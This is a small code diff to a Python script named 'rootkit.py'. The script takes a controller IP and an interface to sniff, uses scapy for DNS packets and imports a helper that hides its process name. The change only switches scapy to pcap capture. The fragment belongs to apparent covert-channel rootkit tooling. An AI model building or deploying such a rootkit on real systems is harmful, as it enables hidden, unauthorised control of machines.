@@ -21,7 +21,7 @@ from utils.validation import validate_ipv4_address, validate_nic_interface
 from utils.process import hide_process_name
 
 # Third Party Libraries
-from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
+from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
 
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
@@ -29,6 +29,8 @@ PARSER.add_argument("controller_ip", help="The IPv4 address of the controller ho
 # PARSER.add_argument("rootkit_ip", help="The IPv4 address of the rootkit host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 ARGS = PARSER.parse_args()
+
+conf.use_pcap = True
 
 
 if not validate_ipv4_address(ARGS.controller_ip):
